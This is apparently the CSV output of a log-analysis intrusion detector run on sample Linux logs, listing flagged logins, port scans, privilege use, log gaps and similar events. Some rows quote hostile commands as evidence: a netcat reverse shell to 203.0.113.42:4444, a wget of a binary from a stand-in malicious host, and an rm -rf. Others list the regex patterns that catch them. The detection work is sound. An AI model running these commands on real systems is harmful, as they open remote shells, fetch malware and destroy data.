detection,failures,first_seen,gap_seconds,geo,host,indicator,ip,last_seen,message,next,ports,ports_sample,prev,process,rdns,sample_lines,timestamp,unique_ports
external_access,,2025-10-14T02:15:01,,{},host1,external_login,203.0.113.42,2025-10-14T06:10:01,Accepted password for root from 203.0.113.42 port 54401 ssh2,,,,,sshd[1234],,"['Oct 14 02:15:01 Accepted password for root from 203.0.113.42 port 54401 ssh2', 'Oct 14 06:10:01 nc -e /bin/sh 203.0.113.42 4444']",Oct 14 02:15:01,
unusual_ports,,2025-10-14T08:10:00,,{},,,192.168.0.10,2025-10-14T08:10:00,,,[33445],,,,,['Oct 14 08:10:00 Accepted password for alice from 192.168.0.10 port 33445'],,1
unusual_ports,,2025-10-14T10:00:01,,{},,,192.168.1.250,2025-10-14T10:00:11,,,"[21, 23, 25, 110, 143, 8080]",,,,,"['Oct 14 10:00:01 IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=21', 'Oct 14 10:00:02 IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=22', 'Oct 14 10:00:03 IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=23']",,6
unusual_ports,,2025-10-14T11:00:01,,{},,,172.16.0.5,2025-10-14T11:00:06,,,[2222],,,,,"['Oct 14 11:00:01 Failed password for invalid user test from 172.16.0.5 port 2222', 'Oct 14 11:00:02 Failed password for invalid user test from 172.16.0.5 port 2222', 'Oct 14 11:00:03 Failed password for invalid user test from 172.16.0.5 port 2222']",,1
unusual_ports,,2025-10-14T11:20:00,,{},,,203.0.113.10,2025-10-14T11:20:00,,,[54321],,,,,['Oct 14 11:20:00 Connection closed by 203.0.113.10 port 54321 [preauth]'],,1
unusual_ports,,2025-10-14T01:05:01,,{},,,192.168.1.101,2025-10-14T01:05:10,,,"[54321, 54322, 54323]",,,,,"['Oct 14 01:05:01 Failed password for invalid user admin from 192.168.1.101 port 54321 ssh2', 'Oct 14 01:05:05 Failed password for invalid user admin from 192.168.1.101 port 54322 ssh2', 'Oct 14 01:05:10 Failed password for invalid user admin from 192.168.1.101 port 54323 ssh2']",,3
unusual_ports,,2025-10-14T01:10:01,,{},,,10.0.0.5,2025-10-14T01:10:01,,,[54400],,,,,['Oct 14 01:10:01 Accepted password for root from 10.0.0.5 port 54400 ssh2'],,1
unusual_ports,,2025-10-14T02:15:01,,{},,,203.0.113.42,2025-10-14T06:10:01,,,[54401],,,,,"['Oct 14 02:15:01 Accepted password for root from 203.0.113.42 port 54401 ssh2', 'Oct 14 06:10:01 nc -e /bin/sh 203.0.113.42 4444']",,1
unusual_ports,,2025-10-14T02:20:01,,{},,,10.0.0.20,2025-10-14T02:20:01,,,[54402],,,,,['Oct 14 02:20:01 Accepted password for user1 from 10.0.0.20 port 54402 ssh2'],,1
unusual_ports,,2025-10-14T05:05:01,,{},,,198.51.100.23,2025-10-14T05:05:03,,,"[2222, 2223, 2224]",,,,,"['Oct 14 05:05:01 Connection from 198.51.100.23 to port 2222', 'Oct 14 05:05:02 Connection from 198.51.100.23 to port 2223', 'Oct 14 05:05:03 Connection from 198.51.100.23 to port 2224']",,3
suspicious_process,,,,{},host1,exec_from_/tmp/,,,user1 : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/myscript.sh,,,,,sudo,,['Oct 14 03:05:01 user1 : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/myscript.sh'],Oct 14 03:05:01,
suspicious_process,,,,{},host1,exec_from_/tmp/,,,/tmp/evil.sh executed,,,,,bash[2345],,['Oct 14 03:20:01 /tmp/evil.sh executed'],Oct 14 03:20:01,
unexpected_priv,,,,{},server,uid=0,,,pam_unix(sshd:session): session opened for user root by (uid=0),,,,,sshd[2001],,['Oct 14 09:00:02 pam_unix(sshd:session): session opened for user root by (uid=0)'],Oct 14 09:00:02,
new_user_accounts,,,,{},host1,user_creation,,,new user testuser added to system,,,,,useradd[2001],,['Oct 14 03:15:01 new user testuser added to system'],Oct 14 03:15:01,
file_modifications,,,,{},host1,mod_/etc,,,chmod 777 /etc/passwd,,,,,chmod[2346],,['Oct 14 03:25:01 chmod 777 /etc/passwd'],Oct 14 03:25:01,
log_gaps,,,3900,{},,log_gap,,,,2025-10-14T02:15:01,,,2025-10-14T01:10:01,,,[],,
log_gaps,,,6000,{},,log_gap,,,,2025-10-14T08:00:01,,,2025-10-14T06:20:01,,,[],,
bad_filenames,,,,{},host1,bad_filename:evil.sh,,,/tmp/evil.sh executed,,,,,bash[2345],,['Oct 14 03:20:01 /tmp/evil.sh executed'],Oct 14 03:20:01,
bad_filenames,,,,{},host1,bad_filename:bad.bin,,,wget http://malicious.example.com/bad.bin,,,,,curl[4001],,['Oct 14 06:05:01 wget http://malicious.example.com/bad.bin'],Oct 14 06:05:01,
outbound_connections,,2025-10-14T06:20:01,,{},host1,outbound_by_sshd,198.51.100.99,2025-10-14T06:20:01,outbound connection ESTABLISHED 198.51.100.99:443 by sshd,,,,,sshd[4004],,['Oct 14 06:20:01 outbound connection ESTABLISHED 198.51.100.99:443 by sshd'],Oct 14 06:20:01,
command_injection,,,,{},server,injection:;\s*,,,bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt-get update,,,,,sudo,,['Oct 14 09:00:00 bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt-get update'],Oct 14 09:00:00,
command_injection,,,,{},server,injection:;\s*,,,alice : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/vi /etc/hosts,,,,,sudo,,['Oct 14 09:02:00 alice : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/vi /etc/hosts'],Oct 14 09:02:00,
command_injection,,,,{},host1,injection:;\s*,,,user1 : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/myscript.sh,,,,,sudo,,['Oct 14 03:05:01 user1 : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/myscript.sh'],Oct 14 03:05:01,
command_injection,,,,{},host1,injection:wget\s+,,,wget http://malicious.example.com/bad.bin,,,,,curl[4001],,['Oct 14 06:05:01 wget http://malicious.example.com/bad.bin'],Oct 14 06:05:01,
command_injection,,,,{},host1,injection:nc\s+-e,,,nc -e /bin/sh 203.0.113.42 4444,,,,,bash[4002],,['Oct 14 06:10:01 nc -e /bin/sh 203.0.113.42 4444'],Oct 14 06:10:01,
command_injection,,,,{},host1,injection:rm\s+-rf\s+/,,,rm -rf /tmp/*,,,,,bash[4003],,['Oct 14 06:15:01 rm -rf /tmp/*'],Oct 14 06:15:01,
